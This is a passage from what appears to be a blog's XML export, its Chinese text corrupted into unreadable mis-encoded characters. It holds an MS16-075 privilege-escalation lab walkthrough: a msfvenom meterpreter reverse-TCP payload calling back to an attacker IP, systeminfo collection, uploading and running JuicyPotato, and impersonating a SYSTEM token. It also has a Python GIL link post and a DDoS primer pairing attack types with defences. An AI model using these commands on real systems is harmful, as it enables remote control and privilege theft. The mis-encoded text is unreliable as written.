    <content type="text"><![CDATA[å…‰çœ‹ç½‘ä¸Šçš„æ–‡ç« æ˜¯ä¸å¤Ÿçš„ï¼Œè¿˜æ˜¯è¦å¤šåŠ¨æ‰‹æ‰è¡Œ ms16-075æ¼æ´ç®€ä»‹Windows SMB æœåŠ¡å™¨ç‰¹æƒæå‡æ¼æ´ï¼ˆCVEæ¼æ´ç¼–å·ï¼šCVE-2016-3225ï¼‰å½“æ”»å‡»è€…è½¬å‘é€‚ç”¨äºåœ¨åŒä¸€è®¡ç®—æœºä¸Šè¿è¡Œçš„å…¶ä»–æœåŠ¡çš„èº«ä»½éªŒè¯è¯·æ±‚æ—¶ï¼ŒMicrosoft æœåŠ¡å™¨æ¶ˆæ¯å— (SMB) ä¸­å­˜åœ¨ç‰¹æƒæå‡æ¼æ´ï¼ŒæˆåŠŸåˆ©ç”¨æ­¤æ¼æ´çš„æ”»å‡»è€…å¯ä»¥ä½¿ç”¨æå‡çš„ç‰¹æƒæ‰§è¡Œä»»æ„ä»£ç ã€‚æ¼æ´è¯¦æƒ…ï¼Œè¯·æˆ³è¿™é‡Œ å¼€å§‹åŠ¨æ‰‹1.å‡è®¾æ˜¯msfvenomç”Ÿæˆæœ¨é©¬ï¼Œç›®æ ‡æ‰§è¡Œäº†ï¼Œç›‘å¬ä¼šè¯ï¼Œè·å¾—meterpreterä¼šè¯æƒé™ msfvenom -p windows/meterpreter_reverse_tcp lhost=192.168.0.103 lport=4444 -f exe > shell.exe 2.å…ˆçœ‹ä¸€ä¸‹å½“å‰æƒé™(ç¡®ä¿æˆ‘æ²¡æœ‰ä½œå¼Š) 3.æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ï¼Œå¹¶å¯¼å‡º # (è¿›å…¥cmd) shell chcp 65001 # å°†ç¼–ç æ ¼å¼æ”¹ä¸ºutf-8ä¸­æ–‡ systeminfo >> c:\out.txt å°†ç³»ç»Ÿä¿¡æ¯è¾“å‡ºåˆ°out.txtæ–‡ä»¶ 4.åœ¨meterpreteræŠŠç»“æœæ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ° download D:\\xxxx\\upload\\out.txt /tmp/out.txt 5.è¿™é‡Œé€‰æ‹©Windows-Exploit-Suggesteææƒè¾…åŠ©å·¥å…·ï¼Œå¯¹ç»“æœæ–‡ä»¶åœ¨æœ¬åœ°è¿›è¡Œåˆ†æ, æŸ¥æ‰¾ç³»ç»Ÿæœªæ‰“è¡¥ä¸æœ‰å“ªäº› python windows-exploit-suggester.py --update python windows-exploit-suggester.py -i out.txt -d 2020-05-09-mssb.xls -l # -iæ˜¯systeminfoçš„ç»“æœæ–‡ä»¶ å¯ä»¥çœ‹åˆ°å¯èƒ½å­˜åœ¨ms16-075æ¼æ´ 6.å¼€å§‹éªŒè¯ # ä¸Šä¼ ms16-075çš„exp: JuicyPotato.exeè‡³é¶æœº upload /root/Desktop/JuicyPotato.exe C:\\ execute -cH -f C:\\JuicyPotato.exe # æ‰§è¡Œpoc(å‰é¢å·²ç»æŠŠpocä¸Šä¼ åˆ°ç›®æ ‡äº†), åˆ›å»ºæ–°çš„è¿›ç¨‹ impersonate_token "NT AUTHORITY\\SYSTEM" # çªƒå–, å‡å†’ç›®æ ‡ä¸»æœºä¸Šçš„å¯ç”¨ä»¤ç‰Œ 7.æŸ¥çœ‹å½“å‰æƒé™ï¼Œæå–æˆåŠŸ getuid # æŸ¥çœ‹å½“å‰æƒé™ 8.åé¢çš„äº‹æƒ…ï¼Œå˜¿å˜¿ä½ æ‡‚å¾— è¿™é‡Œåªæ˜¯æ²¡æœ‰é˜²æŠ¤çš„æƒ…å†µä¸‹çš„ä¸€æ¬¡ç®€å•å®éªŒï¼Œæœ‰ç‚¹ç®€é™‹æœ‰ç‚¹æ°´ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>çƒ‚åœŸè±†</tag>
        <tag>ææƒ</tag>
        <tag>ms-16075</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pythonè¿›ç¨‹ä¹‹é—´å…¨å±€é”(GIL)]]></title>
    <url>%2Fposts%2F30441%2F</url>
    <content type="text"><![CDATA[æ„Ÿè§‰è¿™ç¯‡æ–‡ç« å†™çš„ä¸é”™ï¼š ç‚¹å‡»è¿™é‡Œ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>å…¨å±€é”</tag>
        <tag>GIL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DDoSå…¥é—¨å­¦ä¹ ]]></title>
    <url>%2Fposts%2F64661%2F</url>
    <content type="text"><![CDATA[ä¹‹å‰ä»¥ä¸ºDDoså¾ˆç®€å•ï¼Œç°åœ¨å‘ç°å­¦é—®è¿˜æ˜¯å¤§æ»´å¾ˆå‘¢ï¼ï¼ï¼ ç†è®ºDDOSç®€ä»‹DDOS(Distributed Denial of Service)ï¼Œåˆç§°åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡æ”»å‡»ã€‚æ˜¯æŒ‡å¤„äºä¸åŒä½ç½®çš„å¤šä¸ªæ”»å‡»è€…åŒæ—¶å‘ä¸€ä¸ªæˆ–æ•°ä¸ªç›®æ ‡å‘åŠ¨æ”»å‡»ï¼Œæˆ–è€…ä¸€ä¸ªæ”»å‡»è€…æ§åˆ¶äº†ä½äºä¸åŒä½ç½®çš„å¤šå°æœºå™¨å¹¶åˆ©ç”¨è¿™äº›æœºå™¨å¯¹å—å®³è€…åŒæ—¶å®æ–½æ”»å‡»ã€‚ç”±äºæ”»å‡»çš„å‘å‡ºç‚¹æ˜¯åˆ†å¸ƒåœ¨ä¸åŒåœ°æ–¹çš„ï¼Œè¿™ç±»æ”»å‡»ç§°ä¸ºåˆ†å¸ƒå¼æ‹’ç»æœåŠ¡æ”»å‡»ï¼Œå…¶ä¸­çš„æ”»å‡»è€…å¯ä»¥æœ‰å¤šä¸ªã€‚åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡æ”»å‡»æ–¹å¼åœ¨è¿›è¡Œæ”»å‡»çš„æ—¶å€™ï¼Œå¯ä»¥å¯¹æºIPåœ°å€è¿›è¡Œä¼ªé€ ï¼Œè¿™æ ·å°±ä½¿å¾—è¿™ç§æ”»å‡»åœ¨å‘ç”Ÿçš„æ—¶å€™éšè”½æ€§æ˜¯éå¸¸å¥½çš„ï¼ŒåŒæ—¶è¦å¯¹æ”»å‡»è¿›è¡Œæ£€æµ‹ä¹Ÿæ˜¯éå¸¸å›°éš¾çš„ï¼Œå› æ­¤è¿™ç§æ”»å‡»æ–¹å¼ä¹Ÿæˆä¸ºäº†éå¸¸éš¾ä»¥é˜²èŒƒçš„æ”»å‡»ã€‚ DDOSå±å®³å‡ºå£å¸¦å®½å µæ­»æ¸¸æˆæ‰çº¿å¯¼è‡´å®¢æˆ·æµå¤±æœåŠ¡å™¨è¿æ¥æ•°å¤šï¼Œè¿æ¥èµ„æºè¢«è€—å°½æœåŠ¡å™¨å¡ã€æ…¢ã€æ­»æœºã€æ— æ³•è¿æ¥ æµé‡ç‰¹ç‚¹IPåœ°å€éšæœºæˆ–å›ºå®šæŸäº›IPæ®µéšæœºæ²¡æœ‰å®Œæ•´å®Œæˆä¸‰æ¬¡æ¡æ‰‹åœ°å€å¤šæ•°æ˜¯ä¼ªé€ çš„è¯·æ±‚æ•°é‡å¤§ã€å¿« DDOSæ”»å‡»ç±»å‹ä¸é˜²å¾¡1.Smurfæ”»å‡»æ”»å‡»è€…å‘ç½‘å…³(ç½‘ç»œå¹¿æ’­åœ°å€)å‘é€ICMPè¯·æ±‚åŒ…ï¼Œå¹¶å°†è¯¥ICMPè¯·æ±‚æŠ¥æ–‡çš„æºåœ°å€ä¼ªé€ æˆå—å®³ä¸»æœºIPåœ°å€ï¼Œç›®çš„åœ°å€ä¸ºå¹¿æ’­åœ°å€ã€‚è·¯ç”±å™¨åœ¨æ¥å—åˆ°è¯¥æ•°æ®åŒ…ï¼Œå‘ç°ç›®çš„åœ°å€æ˜¯å¹¿æ’­åœ°å€ï¼Œå°±ä¼šå°†è¯¥æ•°æ®åŒ…å¹¿æ’­å‡ºå»ï¼Œå±€åŸŸç½‘å†…æ‰€æœ‰çš„å­˜æ´»ä¸»æœºéƒ½ä¼šå—åˆ°ä¸€ä¸ªICMPè¯·æ±‚åŒ…ï¼Œæºåœ°å€æ˜¯å—å®³ä¸»æœºIPã€‚æ¥ä¸‹æ¥å—å®³ä¸»æœºå°±ä¼šæ”¶åˆ°è¯¥ç½‘ç»œå†…æ‰€æœ‰ä¸»æœºå‘æ¥çš„ICMPåº”ç­”æŠ¥æ–‡ï¼Œé€šè¿‡å¤§é‡è¿”å›çš„ICMPåº”ç­”æŠ¥æ–‡æ¥æ·¹æ²¡å—å®³ä¸»æœºï¼Œæœ€ç»ˆå¯¼è‡´ç½‘ç»œé˜»å¡ï¼Œå—å®³ä¸»æœºå´©æºƒã€‚ä¸‹é¢æ˜¯smurfæ”»å‡»ç¤ºæ„å›¾ï¼ˆç›—çš„å›¾ï¼‰ é˜²æŠ¤æ–¹æ¡ˆï¼š ç¦æ­¢è·¯ç”±å™¨å¹¿æ’­ICMPè¯·æ±‚åŒ…ï¼› ç¦æ­¢æ“ä½œç³»ç»Ÿå¯¹å¹¿æ’­å‘å‡ºçš„ICMPè¯·æ±‚åŒ…åšå‡ºå“åº”ï¼› é…ç½®é˜²ç«å¢™é™æ­¢æ¥è‡ªä½ æ‰€å¤„ç½‘ç»œå¤–éƒ¨çš„pingåŒ… 2.TearDropæ”»å‡»æ˜¯ä¸€ç§ç•¸å½¢æŠ¥æ–‡æ”»å‡»ï¼ŒåŸºäºUDPçš„ç—…æ€åˆ†ç‰‡æ•°æ®åŒ…çš„æ”»å‡»æ–¹æ³•ã€‚é€šè¿‡è®¾ç½®é”™è¯¯çš„ç‰‡åç§»(IPåˆ†æ®µ)ï¼Œä½¿å¾—æ•°æ®åŒ…åˆ°è¾¾ç›®çš„åœ°æ—¶ï¼ŒæœåŠ¡å™¨æ— æ³•é‡æ–°ç»„åˆæ•°æ®åŒ…ï¼Œå› ä¸ºæ•°æ®åŒ…çš„ç»„åˆæ˜¯é€šè¿‡ç‰‡åç§»æ¥ç»„è£…çš„ï¼Œæœ€ç»ˆå¯¼è‡´å´©æºƒã€‚å¯¹æ¯”ä¸€ä¸‹æ­£å¸¸IPæ•°æ®åŒ…å’Œé”™è¯¯IPæ•°æ®åŒ…è¿™ç§æ”»å‡»ä¸»è¦å¯¹æ—§çš„windowsç‰ˆæœ¬å’ŒLinuxç‰ˆæœ¬æœ‰æ•ˆã€‚ é˜²æŠ¤ï¼šå¯ä»¥æ£€æµ‹å‘æ¥çš„æ•°æ®åŒ…ç‰‡åç§»æ˜¯å¦åˆæ³•ï¼Œå¦‚æœåˆæ³•åœ¨ç»„è£…ï¼Œä¸åˆæ³•ç›´æ¥ä¸¢å¼ƒã€‚æ¯”å¦‚è¿™ä¸ªï¼šåˆ†ç‰‡é‡ç»„æ£€æŸ¥ç®—æ³• 3.Land Attackï¼ˆç€é™†æ”»å‡»ï¼‰æ”»å‡»è€…å‘åŠ¨Land Attackæ”»å‡»æ—¶ï¼Œéœ€è¦å…ˆå‘å‡ºä¸€ä¸ªSYNæ•°æ®åŒ…ï¼Œå¹¶å°†æ•°æ®åŒ…çš„æºIPä¸ç›®çš„IPéƒ½è®¾ç½®æˆè¦æ”»å‡»çš„ç›®æ ‡IPï¼Œè¿™æ ·ç›®æ ‡åœ¨æ¥æ”¶åˆ°SYNæ•°æ®åŒ…åï¼Œä¼šæ ¹æ®æºIPå›åº”ä¸€ä¸ªSYN+ACKæ•°æ®åŒ…ï¼Œå³å’Œè‡ªå·±å»ºç«‹ä¸€ä¸ªç©ºè¿æ¥ï¼Œç„¶ååˆ°è¾¾idelè¶…æ—¶æ—¶é—´æ—¶ï¼Œæ‰ä¼šé‡Šæ”¾è¿™ä¸ªè¿æ¥ã€‚æ”»å‡»è€…å‘é€å¤§é‡è¿™æ ·çš„æ•°æ®åŒ…ï¼Œä»è€Œè€—å°½ç›®æ ‡çš„TCPè¿æ¥æ± ï¼Œæœ€ç»ˆå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚ Kali Linuxæä¾›çš„å¾ˆå¤šå·¥å…·ï¼Œéƒ½å¯ä»¥å®ç°ä¼ªé€ åŒ…çš„åŠŸèƒ½ï¼Œå¦‚hping3ã€‚ é˜²å¾¡æ–¹æ¡ˆï¼šè¿™ç§æ”»å‡»å¯¹æ—©æœŸç³»ç»Ÿæœ‰æ•ˆã€‚é€šè¿‡é˜²ç«å¢™ã€è·¯ç”±è®¾å¤‡ï¼Œå»ºç«‹è§„åˆ™ï¼Œä¸¢å¼ƒæºåœ°å€å’Œç›®æ ‡åœ°å€ç›¸åŒçš„SYNã€SYN+ACKçš„TCPã€‚ 4.YN FLOODæ”»å‡»SYN FLOODæ”»å‡»æ˜¯åœ¨TCPä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹ä¸­äº§ç”Ÿçš„ã€‚æ”»å‡»è€…é€šè¿‡å‘é€å¤§é‡ä¼ªé€ çš„å¸¦æœ‰SYNæ ‡å¿—ä½çš„TCPæŠ¥æ–‡ï¼Œä¸ç›®æ ‡ä¸»æœºå»ºç«‹äº†å¾ˆå¤šè™šå‡çš„åŠå¼€è¿æ¥ï¼Œåœ¨æœåŠ¡å™¨è¿”å›SYN+ACKæ•°æ®åŒ…åï¼Œæ”»å‡»è€…ä¸å¯¹å…¶åšå‡ºå“åº”ï¼Œä¹Ÿå°±æ˜¯ä¸è¿”å›ACKæ•°æ®åŒ…ç»™æœåŠ¡å™¨ï¼Œè¿™æ ·æœåŠ¡å™¨å°±ä¼šä¸€ç›´ç­‰å¾…ç›´åˆ°è¶…æ—¶ã€‚è¿™ç§æ”»å‡»æ–¹å¼ä¼šä½¿ç›®æ ‡æœåŠ¡å™¨è¿æ¥èµ„æºè€—å°½ã€é“¾è·¯å µå¡ï¼Œä»è€Œè¾¾åˆ°æ‹’ç»æœåŠ¡çš„ç›®çš„ é˜²å¾¡ï¼š SYNCheckï¼šä½¿ç”¨é˜²æŠ¤è®¾å¤‡ï¼Œ3æ¬¡æ¡æ‰‹å˜æˆäº†6æ¬¡æ¡æ‰‹ï¼Œç”±é˜²æŠ¤è®¾å¤‡æ£€æµ‹SYNè¯·æ±‚æ˜¯å¦åˆæ³•ï¼Œé€šè¿‡åå†ç”±é˜²æŠ¤è®¾å¤‡å°†æŠ¥æ–‡è½¬å‘ç»™æœåŠ¡å™¨ï¼Œåç»­æŠ¥æ–‡ä»ç”±é˜²æŠ¤è®¾å¤‡ä»£ç†ã€‚ Micro blocksï¼šç®¡ç†å‘˜å¯ä»¥åœ¨å†…å­˜ä¸­ä¸ºæ¯ä¸ªSYNè¯·æ±‚åˆ›å»ºä¸€ä¸ªå°ç´¢å¼•(å°äº16å­—èŠ‚)ï¼Œè€Œä¸å¿…æŠŠæ•´ä¸ªè¿æ¥å¯¹è±¡å­˜å…¥å†…å­˜ã€‚ RST cookiesï¼šåœ¨å®¢æˆ·ç«¯å‘èµ·ç¬¬ä¸€ä¸ªSYNè¯·æ±‚åï¼ŒæœåŠ¡å™¨æ•…æ„å›åº”ä¸€ä¸ªé”™è¯¯çš„SYN+ACKæŠ¥æ–‡ã€‚å¦‚æœåˆæ³•ç”¨æˆ·æ”¶åˆ°è¿™ä¸ªæŠ¥æ–‡ï¼Œå°±ä¼šç»™æœåŠ¡å™¨å“åº”RSTæŠ¥æ–‡ã€‚å½“æœåŠ¡å™¨æ”¶åˆ°è¿™ä¸ªæŠ¥æ–‡æ—¶ï¼Œå°±å°†è¿™ä¸ªä¸»æœºçš„IPè®°å½•è¿›åˆæ³•IPåˆ—è¡¨ï¼Œä¸‹æ¬¡è¯¥ä¸»æœºå‘èµ·SYNè¯·æ±‚æ—¶ï¼Œå°±å¯ä»¥ç›´æ¥é€šè¿‡äº†ã€‚ STACK tweakingï¼šç®¡ç†å‘˜å¯ä»¥è°ƒæ•´TCPå †æ ˆä»¥å‡ç¼“SYNæ³›æ´ªæ”»å‡»çš„å½±å“ã€‚è¿™åŒ…æ‹¬å‡å°è¶…æ—¶æ—¶é—´ï¼Œç­‰åˆ°å †æ ˆå­˜é‡Šå†…æ”¾æ—¶å†åˆ†é…è¿æ¥ï¼Œå¦åˆ™å°±éšæœºæ€§åœ°åˆ é™¤ä¼ å…¥çš„è¿æ¥ã€‚ 5.ACK FLOODæ”»å‡»ACK FLOODæ”»å‡»æ˜¯åˆ©ç”¨TCPä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹ã€‚è¿™é‡Œå¯ä»¥åˆ†ä¸ºä¸¤ç§ã€‚ç¬¬ä¸€ç§ï¼šæ”»å‡»è€…ä¼ªé€ å¤§é‡çš„SYN+ACKåŒ…å‘é€ç»™ç›®æ ‡ä¸»æœºï¼Œç›®æ ‡ä¸»æœºæ¯æ”¶åˆ°ä¸€ä¸ªSYN+ACKæ•°æ®åŒ…æ—¶ï¼Œéƒ½ä¼šå»è‡ªå·±çš„TCPè¿æ¥è¡¨ä¸­æŸ¥çœ‹æœ‰æ²¡æœ‰ä¸ACKçš„å‘é€è€…å»ºç«‹è¿æ¥ ï¼Œå¦‚æœæœ‰åˆ™å‘é€ACKåŒ…å®ŒæˆTCPè¿æ¥ï¼Œå¦‚æœæ²¡æœ‰åˆ™å‘é€ACK+RST æ–­å¼€è¿æ¥ã€‚ä½†æ˜¯åœ¨æŸ¥è¯¢è¿‡ç¨‹ä¸­ä¼šæ¶ˆè€—ä¸€å®šçš„CUPè®¡ç®—èµ„æºã€‚å¦‚æœç¬é—´æ”¶åˆ°å¤§é‡çš„SYN+ACKæ•°æ®åŒ…ï¼Œå°†ä¼šæ¶ˆè€—æœåŠ¡å™¨çš„å¤§é‡cpuèµ„æºï¼Œå¯¼è‡´æ­£å¸¸çš„è¿æ¥æ— æ³•å»ºç«‹æˆ–å¢åŠ å»¶è¿Ÿï¼Œç”šè‡³é€ æˆæœåŠ¡å™¨ç˜«ç—ªã€æ­»æœºã€‚ ç¬¬äºŒç§ï¼šåˆ©ç”¨TCPä¸‰æ¬¡æ¡æ‰‹çš„ACK+SYNåº”ç­”ï¼Œæ”»å‡»è€…å‘ä¸åŒçš„æœåŠ¡å™¨å‘é€å¤§é‡çš„SYNè¯·æ±‚ï¼Œè¿™äº›SYNè¯·æ±‚æ•°æ®åŒ…çš„æºIPå‡ä¸ºå—å®³ä¸»æœºIPï¼Œè¿™æ ·å°±ä¼šæœ‰å¤§é‡çš„SYN+ACKåº”ç­”æ•°æ®åŒ…å‘å¾€å—å®³ä¸»æœºï¼Œä»è€Œå ç”¨ç›®æ ‡çš„ç½‘ç»œå¸¦å®½èµ„æºï¼Œå½¢æˆæ‹’ç»æœåŠ¡ã€‚ é€šå¸¸DDOSæ”»å‡»ä¼šå°†ACK floodä¸SYN floodç»“åˆåœ¨ä¸€èµ·ï¼Œä»è€Œæ‰©å¤§å¨åŠ›ã€‚ é˜²å¾¡æ–¹æ¡ˆå‚è€ƒï¼š é‡‡ç”¨CDNè¿›è¡Œæµé‡ç¨€é‡Šï¼› é¿å…æœåŠ¡å™¨IPæš´éœ²åœ¨å…¬ç½‘ä¸Šï¼› é€šè¿‡é™é€Ÿæˆ–åŠ¨æ€æŒ‡çº¹çš„æ–¹å¼ï¼› åˆ©ç”¨å¯¹ç§°æ€§åˆ¤æ–­æ¥åˆ†æå‡ºæ˜¯å¦æœ‰æ”»å‡»å­˜åœ¨ï¼› åœ¨è¿ç»­æ”¶åˆ°ç”¨æˆ·å‘é€çš„ACKåŒ…æ—¶ï¼Œä¸­æ–­å›è¯ï¼Œè®©å…¶é‡è¿ã€‚ 6.UDP FLOODæ”»å‡»(UDPæ³›æ´ªæ”»å‡»)å› ä¸ºUDPä¸éœ€è¦ä¸‰æ¬¡æ¡æ‰‹ï¼Œè¿™å°±é€ æˆUDPæ³›æ´ªæ”»å‡»ä¸ä½†æ•ˆç‡é«˜ï¼Œè€Œä¸”è¿˜å¯ä»¥åœ¨èµ„æºç›¸å¯¹è¾ƒå°‘çš„æƒ…å†µä¸‹æ‰§è¡Œã€‚UDP FLOODå¯ä»¥ä½¿ç”¨å°æ•°æ®åŒ…(64å­—èŠ‚)è¿›è¡Œæ”»å‡»,ä¹Ÿå¯ä»¥ä½¿ç”¨å¤§æ•°æ®åŒ…(å¤§äº1500å­—èŠ‚,ä»¥å¤ªç½‘MTUä¸º1500å­—èŠ‚)è¿›è¡Œæ”»å‡»ã€‚å¤§é‡å°æ•°æ®åŒ…ä¼šå¢å¤§ç½‘ç»œè®¾å¤‡å¤„ç†æ•°æ®åŒ…çš„å‹åŠ›ï¼›è€Œå¯¹äºå¤§æ•°æ®åŒ…ï¼Œç½‘ç»œè®¾å¤‡éœ€è¦è¿›è¡Œåˆ†ç‰‡ã€é‡ç»„ï¼Œæœ€ç»ˆè¾¾åˆ°çš„æ•ˆæœå°±æ˜¯å ç”¨ç½‘ç»œä¼ è¾“æ¥å£çš„å¸¦å®½ã€ç½‘ç»œå µå¡ã€æœåŠ¡å™¨å“åº”æ…¢ç­‰ç­‰ã€‚ é˜²å¾¡æ–¹æ¡ˆï¼š é™åˆ¶æ¯ç§’é’Ÿæ¥å—åˆ°çš„æµé‡(å¯èƒ½äº§ç”Ÿè¯¯åˆ¤)ï¼› é€šè¿‡åŠ¨æ€æŒ‡çº¹å­¦ä¹ (éœ€è¦æ”»å‡»å‘ç”Ÿä¸€å®šæ—¶é—´)ï¼Œå°†éæ³•ç”¨æˆ·åŠ å…¥é»‘åå•ã€‚ 7.NTPæ”¾å¤§æ”»å‡»NTP(Network Time Protocolï¼Œç½‘ç»œæ—¶é—´åè®®)ï¼Œæ˜¯ç”¨æ¥ä½¿è®¡ç®—æœºç½‘ç»œæ—¶é—´åŒæ­¥åŒ–çš„ä¸€ç§åè®®ï¼Œä½¿ç”¨UDP123ç«¯å£è¿›è¡Œé€šä¿¡ã€‚é€šå¸¸åœ¨NTPæœåŠ¡å™¨ä¸Šä¼šæœ‰ä¸€äº›è°ƒè¯•æ¥å£ï¼Œè€Œåˆ©ç”¨è¿™äº›æ¥å£ä¸­çš„monlistè¯·æ±‚ï¼Œå°±å¯è§¦å‘æ”¾å¤§æ”»å‡»ã€‚å½“ä¸»æœºå‘NTPæœåŠ¡å™¨å‘é€monlistæŸ¥è¯¢è¯·æ±‚æ—¶ï¼ŒNTPæœåŠ¡å™¨ä¼šå°†ä¸ä¹‹è¿›è¡Œæ—¶é—´åŒæ­¥çš„æœ€å600ä¸ªIPåœ°å€è¿”å›ã€‚æ‰€ä»¥æ”»å‡»è€…åªéœ€è¦å°†æºåœ°å€ä¼ªé€ ä¸ºå—å®³ä¸»æœºçš„IPï¼Œå‘NTPæœåŠ¡å™¨å‘é€ä¸€ä¸ªmonlistæŸ¥è¯¢è¯·æ±‚åŒ…ï¼Œå—å®³ä¸»æœºå°±ä¼šæ”¶åˆ°å¤§é‡çš„UDPå“åº”åŒ…ã€‚è¿™ç§æ”»å‡»åœ¨æ”¾å¤§æ”»å‡»é‡Œï¼Œå±å®³ç›¸å¯¹è¾ƒå¤§ã€‚ è¿™ç§æ”»å‡»äº§ç”Ÿçš„åŸå› ï¼š è¯·æ±‚ä¸å“åº”æ•°æ®åŒ…ä¸ç­‰ä»·ï¼› UDPåè®®çš„é€šä¿¡æ¨¡ç³Šæ€§ï¼ˆæ— æ•°æ®ä¼ è¾“ç¡®è®¤æœºåˆ¶ï¼‰ï¼› ä»¥åŠNTPæœåŠ¡å™¨çš„æ— è®¤è¯æœºåˆ¶ã€‚ é˜²å¾¡æ–¹æ¡ˆï¼š ä½¿ç”¨é˜² DDoS è®¾å¤‡è¿›è¡Œæ¸…æ´—ï¼› åŠ å›ºå¹¶å‡çº§NTPæœåŠ¡å™¨ï¼› åœ¨ç½‘ç»œå‡ºå£å°ç¦ UDP 123 ç«¯å£ï¼› é€šè¿‡ç½‘ç»œå±‚æˆ–è€…å€ŸåŠ©è¿è¥å•†å®æ–½ ACL æ¥é˜²å¾¡ï¼› å…³é—­ç°åœ¨ NTP æœåŠ¡çš„ monlist åŠŸèƒ½ï¼Œåœ¨ntp.confé…ç½®æ–‡ä»¶ä¸­å¢åŠ disable monitoré€‰é¡¹ã€‚ 8.DNSæ”¾å¤§æ”»å‡»DNSæŠ¥æ–‡æ ¼å¼(å€Ÿä¸ªå›¾)ï¼š é¦–å…ˆï¼Œæ”»å‡»è€…å‘åƒµå°¸ç½‘ç»œå‘å‡ºæŒ‡ä»¤ï¼Œä½¿åƒµå°¸ç½‘ç»œä¸­çš„æ¯ä¸€å°ä¸»æœºå‡å‘å‡ºä¸€ä¸ªä¼ªé€ æºåœ°å€çš„DNSæŸ¥è¯¢è¯·æ±‚åŒ…ï¼Œè¿™äº›è¯·æ±‚åŒ…æŸ¥è¯¢ç±»å‹è®¾ç½®ä¸ºANYï¼Œå› ä¸ºè¿™ç§ç±»å‹ä¼šè¯·æ±‚æ‰€æœ‰çš„è®°å½•ï¼Œè¿™äº›è®°å½•ä¼šåœ¨è¿”å›çš„å“åº”åŒ…ä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ç§æ•°æ®åŒ…çš„å¤§å°è¾ƒå…¶ä»–ç±»å‹æ˜¯æœ€å¤§çš„ã€‚æ¥ç€æŸ¥è¯¢ç±»å‹è®¾ä¸ºé€’å½’æŸ¥è¯¢ï¼Œä¸ºä»€ä¹ˆä¸æ˜¯è¿­ä»£æŸ¥è¯¢å‘¢ï¼Œä»”ç»†çœ‹ä¸¤ç§æŸ¥è¯¢çš„è¿‡ç¨‹å›¾å¯å‘ç°ï¼Œå¦‚æœè¿­ä»£æŸ¥è¯¢ç¬¬ä¸€ä¸ªè¯·æ±‚çš„DNSæœåŠ¡å™¨æ²¡æœ‰æŸ¥è¯¢åˆ°ç»“æœï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªè¯·æ±‚çš„æœåŠ¡å™¨ä¼šè¿”å›å¦ä¸€ä¸ªDNSæœåŠ¡å™¨IPï¼Œè®©è¯·æ±‚ä¸»æœºå‘è¿™ä¸ªIPå»ç»§ç»­æŸ¥è¯¢ï¼Œç„¶è€Œæ”»å‡»è€…çš„æ•°æ®åŒ…æºåœ°å€æ˜¯ä¼ªé€ çš„ï¼Œæ‰€ä»¥å¹¶ä¸ä¼šå‘èµ·ç¬¬äºŒæ¬¡æŸ¥è¯¢ï¼Œå› ä¸ºç¬¬ä¸€æ¬¡æŸ¥è¯¢æ ¹æœ¬å°±ä¸æ˜¯å®ƒå‘èµ·çš„ï¼›è€Œé€’å½’æŸ¥è¯¢å´æ˜¯åœ¨æŸ¥è¯¢åˆ°ç»“æœä¹‹åï¼Œæ‰è¿”å›ç»™æŸ¥è¯¢è¯·æ±‚å‘èµ·è€…ã€‚åˆ©ç”¨è¿™ä¸¤ä¸ªç‰¹ç‚¹ï¼Œæ”»å‡»è€…å°±å¯ä»¥æˆåŠŸå‘èµ·DNSæ”¾å¤§æ”»å‡»ã€‚è¿™ç§æ™®é€šçš„æŸ¥è¯¢è¯·æ±‚å¯ä»¥å°†æ”»å‡»æµé‡æ”¾å¤§2~10å€ï¼Œå¦‚æœæƒ³å¢å¤§æ”»å‡»å€æ•°ï¼Œå¯ä»¥ä½¿ç”¨RFC 2671ä¸­å®šä¹‰çš„DNSæ‹“å±•æœºåˆ¶EDNS0ã€‚æœªä½¿ç”¨EDNS0æ—¶ï¼Œè‹¥å“åº”åŒ…å¤§å°å°äº512å­—èŠ‚ï¼Œå°±ä½¿ç”¨UDPå°è£…æ•°æ®ï¼›è‹¥å“åº”åŒ…å¤§å°è¶…è¿‡512å­—èŠ‚ï¼Œå°±ä½¿ç”¨TCPè¿æ¥æˆ–è€…æœåŠ¡å™¨æˆªæ–­å“åº”æŠ¥æ–‡ï¼Œä¸¢å¼ƒè¶…è¿‡512å­—èŠ‚çš„éƒ¨åˆ†ï¼Œå¹¶æŠŠTCä½ç½®1ã€‚è¿™ä¸¤ç§æ–¹å¼éƒ½ä¸åˆ©äºè¿›è¡ŒDNSæ”¾å¤§æ”»å‡»ã€‚ç„¶è€Œåœ¨å¼€å¯EDNS0æœºåˆ¶åï¼Œå¢åŠ äº†OPT RRå­—æ®µï¼Œè¿™ä¸¤ä¸ªå­—æ®µåŒ…å«äº†èƒ½å¤Ÿå¤„ç†çš„æœ€å¤§UDPæŠ¥æ–‡å¤§å°ä¿¡æ¯ï¼Œæ‰€ä»¥æ”»å‡»è€…å°†è¿™ä¸ªä¿¡æ¯è®¾ç½®çš„å¾ˆå¤§ï¼ŒæœåŠ¡å™¨å°±ä¼šæ 